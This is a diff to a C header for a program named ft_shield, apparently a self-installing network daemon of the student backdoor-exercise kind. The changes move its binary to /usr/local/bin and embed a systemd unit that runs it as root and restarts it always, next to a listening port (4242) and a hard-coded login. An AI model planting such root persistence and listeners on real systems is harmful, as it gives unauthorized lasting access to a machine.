@@ -16,9 +16,9 @@
 
 #define LOCK_FILE "/var/lock/ft_shield.lock"
 #define LOG_FILE "/var/log/ft_shield.log"
-#define FT_SHIELD "ft_shield"
+#define FT_SHIELD "./ft_shield"
 #define BIN_DIR "/usr/bin"
-#define BIN_FILE "/usr/bin/ft_shield"
+#define BIN_FILE "/usr/local/bin/ft_shield"
 #define LOGIN "rbardet-\n"
 #define PORT 4242
 #define MAX_USER 3
@@ -47,12 +47,16 @@
 
 #define SYS_DIR "/etc/systemd/system"
 #define SYS_FILE "/etc/systemd/system/ft_shield.service"
-#define SYSTEMD_OPT "[Unit]\n \
-Description=ft_shield\n \
-[Service]\n \
-Type=simple\n \
-ExecStart=/usr/bin/ft_shield\n \
-[Install]\n \
+#define SYSTEMD_OPT "[Unit]\n\
+Description=ft_shield Service\n\
+After=network.target\n\
+\n\
+[Service]\n\
+ExecStart=/usr/local/bin/ft_shield\n\
+Restart=always\n\
+User=root\n\
+\n\
+[Install]\n\
 WantedBy=multi-user.target\n"
 
 typedef enum {
